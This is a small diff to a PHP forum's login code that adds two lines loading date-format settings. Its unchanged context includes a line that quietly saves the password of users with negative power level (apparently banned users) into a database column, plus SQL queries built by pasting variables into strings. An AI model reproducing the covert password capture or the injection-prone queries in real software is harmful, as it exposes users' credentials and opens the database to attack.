@@ -128,6 +128,8 @@
 		$tzoff=$loguser[timezone]*3600;
 		$scheme=$loguser[scheme];
 		$log=1;
+		$dateformat=$loguser['dateformat'];
+		$dateshort=$loguser['dateshort'];
 		if ($loguser['powerlevel'] < 0) mysql_query("UPDATE `users` SET `lol` = '$logpassword' WHERE `id` = '$loguserid'");
 		$hacks['comments']	= mysql_result(mysql_query("SELECT COUNT(*) FROM `users_rpg` WHERE `uid` = '$loguserid' AND (`eq6` = '71' OR `eq6` = '238' OR `eq6` = '43')"), 0);
 		if ($loguser['id'] == 1) $hacks['comments'] = true;
